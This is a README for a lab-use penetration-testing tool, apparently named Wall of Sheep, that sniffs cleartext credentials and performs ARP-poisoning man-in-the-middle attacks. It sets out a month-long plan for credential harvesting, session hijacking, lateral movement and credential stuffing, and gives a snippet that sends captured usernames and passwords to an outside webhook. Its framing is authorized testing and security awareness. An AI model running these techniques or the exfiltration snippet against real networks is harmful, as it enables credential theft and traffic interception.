# 🐑 Wall of Sheep — Internal Pentest TUI

> **Authorized lab / educational use only.**  
> Inspired by the DEF CON Wall of Sheep — a legendary security-awareness demo  
> that shows credentials flying over the network in cleartext.

---

## Overview

A terminal-based (TUI) penetration-testing dashboard for monitoring insecure cleartext protocols on an internal network. Built with **Python + Textual + Scapy**.

```
╔════════════════════════════════════════════════════════════════════╗
║  🐑  WALL OF SHEEP  ·  Internal Pentest Monitor                   ║
║  [ 🐑 Wall of Sheep ] [ 📡 Monitor ] [ ⚔ MITM ] [ 📋 Sessions ]  ║
╠═════════════════╦══════════════╦══════════════╦════════════════════╣
║  PACKETS 12,847 ║ CREDS    143 ║  DATA 2.1 MB ║  SESSIONS      31  ║
╠═════════════════╩══════════════╩══════════════╩════════════════════╣
║  ⏱ Time   🖥 Host/IP      ⚡ Proto  👤 Username  🔑 Pass   Method ║
║  08:31:21  192.168.1.101  HTTP     alice         p****d   Form POST║
║  08:31:34  10.0.0.45      FTP      bob           l*****n  FTP AUTH ║
║  08:32:01  192.168.1.103  Telnet   charlie       q*****y  Telnet   ║
╚════════════════════════════════════════════════════════════════════╝
```

---

## Architecture

```
sheepwall/
├── main.py               ← Textual TUI app (all screens + event routing)
├── core/
│   ├── sniffer.py        ← SnifferEngine (Scapy packet capture thread)
│   ├── protocols.py      ← Protocol parsers (HTTP/FTP/Telnet/SMTP/POP3/IMAP)
│   ├── mitm.py           ← MITMEngine (ARP poisoning, session tracking)
│   └── logger.py         ← SQLite persistence (credentials, events, sessions)
├── requirements.txt
└── run.sh
```

### Data flow

```
[Network NIC]
     │  (raw packets via Scapy)
     ▼
SnifferEngine ──► ProtocolParser ──► Credential / NetworkEvent
     │                                         │
     │                                         ▼
     │                                   DatabaseLogger (SQLite)
     │                                         │
     └─────────────────────────────────────────┤
                                               ▼
                                    Textual TUI (main thread)
                                   ┌──────────────────────────┐
                                   │  🐑 Wall of Sheep table  │
                                   │  📡 Event log            │
                                   │  ⚔  MITM panel           │
                                   │  📋 Session tracker      │
                                   └──────────────────────────┘
```

---

## Modules

### 1. Sniffer (`core/sniffer.py`)

Captures raw packets with Scapy on a chosen interface.

| Feature | Detail |
|---|---|
| Promiscuous mode | Yes |
| BPF filter | Optional (e.g. `tcp port 80`) |
| Protocols detected | HTTP, FTP, Telnet, SMTP, POP3, IMAP, DNS, ARP |
| Demo mode | Full simulation without root or Scapy |
| Thread model | Daemon thread; stop via Event flag |

### 2. Protocol Parser (`core/protocols.py`)

Stateless parser; extracts credentials from raw TCP payloads.

| Protocol | Port | What's extracted |
|---|---|---|
| HTTP | 80, 8080 | Basic Auth (base64), Form POST fields |
| FTP | 21 | USER + PASS commands |
| Telnet | 23 | login: / password: prompts |
| SMTP | 25 | AUTH PLAIN (base64 decoded) |
| POP3 | 110 | USER + PASS commands |
| IMAP | 143 | LOGIN command |
| DNS | 53 | Query names (passive recon) |
| ARP | — | Reply spoofing detection |

### 3. MITM Engine (`core/mitm.py`)

ARP-based man-in-the-middle with session tracking.

| Feature | Detail |
|---|---|
| ARP poisoning | Bidirectional (target ↔ gateway) |
| Restore on stop | Sends 4× gratuitous ARP to both sides |
| IP forwarding | `/proc/sys/net/ipv4/ip_forward` toggle |
| Session tracking | Per `(src:port → dst:port)` tuple |
| Interval | 2s between ARP poison sends |

### 4. Logger (`core/logger.py`)

SQLite database at `~/.sheepwall/captures.db`.

Tables: `credentials`, `events`, `sessions`.  
Export: `credentials` → CSV via `e` key.

---

## Setup

### Requirements

- Python ≥ 3.11
- Linux (ARP poisoning / raw sockets require Linux kernel)
- `root` / `sudo` for live capture (demo mode works without)

### Install

```bash
git clone <repo>
cd sheepwall

# Quick start (demo mode, no root needed)
./run.sh --demo

# Live capture (requires root + Scapy)
sudo ./run.sh
```

### Manual install

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install textual rich scapy
sudo python3 main.py --iface eth0
```

---

## Keyboard Shortcuts

| Key | Action |
|---|---|
| `s` | Start sniffer |
| `x` | Stop sniffer |
| `c` | Clear tables |
| `e` | Export credentials to CSV |
| `q` | Quit |
| `Tab` | Switch panels (mouse or keyboard) |

---

## Lab Network Scenario — University Internal Network

### Network map (suggested)

```
Internet
    │
 [Router / FW]  192.168.0.1
    │
 [Core Switch]
    ├── VLAN 10  Student PCs        192.168.10.0/24
    ├── VLAN 20  Faculty / Staff    192.168.20.0/24
    ├── VLAN 30  Servers            192.168.30.0/24
    │               ├── web01   (Apache HTTP, no HTTPS)
    │               ├── ftp01   (vsftpd cleartext)
    │               ├── mail01  (Sendmail SMTP + POP3)
    │               └── ldap01  (OpenLDAP cleartext)
    └── VLAN 99  Pentest attacker   192.168.99.10
```

### Vulnerable services to spin up (Docker-based)

```bash
# Cleartext HTTP login (PHP app)
docker run -d -p 80:80 --name vuln-http webdevops/php-apache

# Cleartext FTP
docker run -d -p 21:21 --name vuln-ftp garethflowers/ftp-server \
  -e FTP_USER=student -e FTP_PASS=password123

# Telnet
docker run -d -p 23:23 --name vuln-telnet alpine:latest telnetd -F

# Cleartext SMTP + POP3
docker run -d -p 25:25 -p 110:110 --name vuln-mail bytemark/smtp
```

---

## 1-Month Achievement Plan

### Week 1 — Environment setup + passive recon

**Goal:** Get the sniffer running, understand traffic patterns.

| Day | Task |
|---|---|
| 1–2 | Deploy lab VMs / Docker containers (HTTP, FTP, Telnet, SMTP) |
| 3–4 | Run `sheepwall --demo` → familiarize with all 4 tabs |
| 5–6 | Run `sudo sheepwall` on live lab net; verify credential capture |
| 7 | Document all insecure services found; build network map |

**Deliverable:** Network topology diagram + list of all cleartext services.

### Week 2 — Active monitoring + credential harvesting

**Goal:** Capture real credentials from lab services.

| Day | Task |
|---|---|
| 8–9 | Configure BPF filters per target: `tcp port 80`, `tcp port 21` |
| 10–11 | Perform controlled logins on each service from victim VM |
| 12–13 | Verify all protocols captured correctly; tune regex parsers |
| 14 | Review `~/.sheepwall/captures.db`; export CSV; review findings |

**Deliverable:** Credential harvest report (username list, protocol breakdown).

### Week 3 — MITM + session interception

**Goal:** Position between victim and gateway; intercept live sessions.

| Day | Task |
|---|---|
| 15–16 | Configure MITM tab: target=victim IP, gateway=router IP |
| 17 | Start MITM; verify IP forwarding with `cat /proc/sys/net/ipv4/ip_forward` |
| 18 | Confirm sessions appear in session table; match with credential captures |
| 19–20 | Try HTTP session token hijacking (copy session cookie from log) |
| 21 | Write up MITM findings; verify ARP restore works cleanly |

**Deliverable:** MITM attack chain documented; session hijacking demo recorded.

### Week 4 — Post-exploitation + reporting

**Goal:** Lateral movement using captured creds; write pentest report.

| Day | Task |
|---|---|
| 22–23 | Use captured FTP creds → access file server; look for sensitive files |
| 24–25 | Use SMTP creds → send internal phishing email as test |
| 26 | Try credential stuffing across other services (same user/pass?) |
| 27–28 | Write final pentest report (exec summary, vuln list, CVSS scores) |
| 29–30 | Remediation: replace HTTP → HTTPS, FTP → SFTP, Telnet → SSH |

**Deliverable:** Full pentest report (PDF) with findings, evidence screenshots, remediation steps.

---

## Extending the Tool

### Add SSL stripping

```python
# In mitm.py, after ARP poisoning is running:
# Install mitmproxy: pip install mitmproxy
# Then: mitmproxy --mode transparent --listen-port 8080
```

### Add DNS spoofing

```python
# Add to sniffer.py DNS handler:
from scapy.all import DNS, DNSRR
# Forge DNS replies for target domains
```

### Add credential alerting (Telegram / Slack)

```python
# In main.py _add_credential():
import requests
requests.post(WEBHOOK_URL, json={"text": f"🐑 {cred.username}:{cred.password} @ {cred.protocol}"})
```

### Extend protocol support

Add parsers to `core/protocols.py` for:
- **LDAP** (port 389) — `BindRequest` PDU contains cleartext credentials
- **RDP** (port 3389) — NLA downgrade to capture NTLM hashes
- **MySQL** (port 3306) — cleartext auth in older `mysql_native_password`
- **Redis** (port 6379) — `AUTH password` command

---

## Legal & Ethical Notice

```
This tool is designed exclusively for:
  • Authorized penetration tests with written scope agreement
  • CTF / lab / educational environments you own or have permission to test
  • Security awareness demonstrations

Using this tool against networks without explicit authorization is
illegal under the Computer Fraud and Abuse Act (US), Computer Misuse
Act (UK), IT Act (India), and equivalent laws worldwide.

Always obtain written authorization before testing.
```
